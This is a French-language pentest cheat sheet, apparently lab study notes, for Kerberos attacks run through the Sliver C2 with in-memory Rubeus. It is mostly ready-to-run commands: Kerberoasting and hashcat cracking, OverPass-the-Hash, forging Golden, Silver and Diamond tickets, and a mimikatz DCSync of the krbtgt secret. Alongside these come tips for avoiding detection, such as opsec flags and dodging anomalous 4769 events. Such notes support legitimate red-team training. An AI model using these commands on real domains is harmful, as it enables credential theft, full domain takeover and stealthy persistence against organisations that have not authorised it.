# Sliver - Kerberos et tickets

> [!summary] Objectif
> Toutes les attaques Kerberos via **Rubeus** exécuté en mémoire : Kerberoasting, OverPass-the-Hash (`asktgt`), Golden/Silver/Diamond ticket, et DCSync. Rubeus est souvent lancé en self-inject (`-i -M -E`) ou empaqueté par PEzor pour l'exécuter à distance. Théorie : [[Kerberos]], [[Attaques AD]].

> [!warning]- Required
> Pour Kerberoast/asktgt : un compte de domaine valide. Pour Golden/DCSync : privilèges Domain Admin (ou droits de réplication). Injection : voir [[w. Sliver C2/Sliver - Exécution et évasion]].

### Kerberoasting (StandIn + Rubeus + Hashcat)

```bash
# 1) Trouver les comptes user à SPN
execute-assembly -p explorer.exe -t 45 '/mnt/c/AD/Tools/Sliver/StandIn.exe' '--spn'

# 2) Demander le TGS et le hash
execute-assembly -i -M -E -t 45 '/mnt/c/AD/Tools/Sliver/Rubeus.exe' 'kerberoast /user:svcadmin /simple /outfile:hashes.txt'
```

```bash
# 3) Cracker offline (VM d'attaque)
hashcat -m 13100 hashes.txt wordlist.txt
```

Viser les comptes **user** à SPN (les comptes machine ont des mots de passe incassables). `/rc4opsec` pour éviter un downgrade détectable sur un compte AES.

### OverPass-the-Hash (asktgt + /ptt)

```bash
execute-assembly -i -M -E -t 45 '/mnt/c/AD/Tools/Sliver/Rubeus.exe' 'asktgt /user:svcadmin /aes256:<AES256> /opsec /show /ptt'
```

`asktgt` forge une demande de TGT à partir d'une clé (hash/AES) et `/ptt` l'injecte dans la session courante → on agit en tant que ce compte. `/opsec` évite les requêtes atypiques. Préférer `/aes256` à `/rc4`.

### Golden Ticket (PEzor + Rubeus)

```bash
# Avec le hash/AES de krbtgt (obtenu par DCSync)
execute-assembly -i -M -E -t 60 '/mnt/c/AD/Tools/Sliver/Rubeus.exe' 'golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:<DOMAIN_SID> /aes256:<KRBTGT_AES> /ptt'
```

Forge un TGT arbitraire signé par krbtgt → domination et persistance tant que krbtgt n'est pas changé deux fois. Souvent empaqueté par PEzor pour l'exécuter à distance sur une cible.

### Silver Ticket

```bash
execute-assembly -i -M -E -t 60 '/mnt/c/AD/Tools/Sliver/Rubeus.exe' 'silver /service:CIFS/dcorp-dc.dollarcorp.moneycorp.local /rc4:<SERVICE_HASH> /sid:<DOMAIN_SID> /user:Administrator /ptt'
```

Forge directement un TGS pour un service précis avec le hash du compte de service — sans jamais contacter le KDC (très discret, portée limitée à ce service).

### Diamond Ticket

```bash
execute-assembly -i -M -E -t 60 '/mnt/c/AD/Tools/Sliver/Rubeus.exe' 'diamond /krbkey:<KRBTGT_AES> /user:studentX /password:<pwd> /enctype:aes /ticketuser:Administrator /domain:dollarcorp.moneycorp.local /ptt'
```

Demande un **vrai** TGT puis modifie/re-signe son PAC avec la clé AES de krbtgt → ticket au PAC légitime, plus furtif que le Golden. Requiert la clé AES de krbtgt.

### DCSync

```bash
# Extraire le secret de krbtgt (droits de réplication requis)
lsadump::dcsync /user:dcorp\krbtgt
```

DCSync se fait passer pour un DC et demande la réplication des secrets. Alternative Sliver : **SharpSecDump** (secretsdump distant). Voir l'obtention des droits dans [[Sliver - AD CS, SQL et persistance]].

> [!note] RC4 vs AES
> Forcer RC4 sur un compte AES-only déclenche un event 4769 anormal. Utiliser `/aes256` quand la clé est disponible, `/rc4opsec` pour Kerberoast furtif.

## Related
- [[Kerberos]]
- [[Attaques AD]]
- [[Sliver - Delegation et RBCD]]
- [[Sliver - AD CS, SQL et persistance]]
- [[Sliver - Toutes les commandes]]
